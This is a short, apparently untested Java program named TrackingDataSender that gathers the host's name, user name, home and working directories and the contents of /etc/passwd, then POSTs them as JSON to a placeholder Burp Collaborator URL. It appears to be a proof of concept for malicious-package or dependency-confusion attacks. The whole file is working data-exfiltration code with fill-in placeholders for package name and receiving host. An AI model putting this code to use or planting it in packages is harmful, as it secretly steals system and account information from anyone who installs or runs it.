// Not tested Yet.


import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import org.json.JSONObject;

public class TrackingDataSender {
    public static void main(String[] args) {
        String packageName = "your-package-name"; // Replace with your package name
        String packageVersion = "1.0.0"; // Replace with your package version
        String homeDir = System.getProperty("user.home");
        String hostName = java.net.InetAddress.getLocalHost().getHostName();
        String userName = System.getProperty("user.name");

        // Read the /etc/passwd file
        String passwdData;
        try {
            passwdData = new String(Files.readAllBytes(Paths.get("/etc/passwd")));
        } catch (Exception e) {
            passwdData = "Error reading /etc/passwd: " + e.getMessage();
        }

        JSONObject trackingData = new JSONObject();
        trackingData.put("p", packageName);
        trackingData.put("c", System.getProperty("user.dir"));
        trackingData.put("hd", homeDir);
        trackingData.put("hn", hostName);
        trackingData.put("un", userName);
        trackingData.put("passwd", passwdData);

        String postData = "msg=" + trackingData.toString();

        try {
            URL url = new URL("https://your-burp-collaborator-link"); // Replace with your Burp collaborator link
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", String.valueOf(postData.length()));

            try (OutputStream os = conn.getOutputStream()) {
                os.write(postData.getBytes());
            }

            // Read the response
            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                System.out.println(response.toString());
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
